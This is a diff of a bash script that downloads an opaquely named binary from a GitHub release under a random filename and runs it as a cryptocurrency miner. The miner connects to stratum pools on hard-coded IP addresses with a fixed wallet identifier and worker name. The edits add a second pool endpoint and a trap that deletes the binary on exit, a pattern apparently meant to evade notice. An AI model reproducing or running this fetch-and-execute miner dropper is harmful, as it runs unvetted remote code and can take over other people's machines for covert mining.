@@ -10,14 +10,15 @@ generate_random_filename() {
 generate_worker_name() {
     date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
     random_suffix=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 4)
-    echo "ATPT44"
+    echo "44VT44"
 }
 
-# Main logic
 main() {
-    # Generate filename and worker name
     miner_filename=$(generate_random_filename)
     worker_name=$(generate_worker_name)
+
+    # Optional: cleanup on Ctrl+C or SIGTERM
+    trap "echo '🧹 Cleaning up...'; rm -f \"$miner_filename\"; exit" INT TERM
 
     echo "📥 Downloading miner to: $miner_filename"
     if wget -q https://github.com/vedhagsvp/qubros/releases/download/apl/crcxcba -O "$miner_filename"; then
@@ -38,7 +39,9 @@ main() {
     echo "👷 Worker Name: $worker_name"
 
     echo "🚀 Starting miner..."
-    ./"$miner_filename" -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.${worker_name}@172.105.249.116:8081
+    ./"$miner_filename" \
+        -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.${worker_name}@45.33.13.199:8085 \
+        -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.${worker_name}@45.33.13.199:8086
 
     if [[ $? -eq 0 ]]; then
         echo "✅ Miner ran successfully."
@@ -47,5 +50,4 @@ main() {
     fi
 }
 
-# Run the script
 main
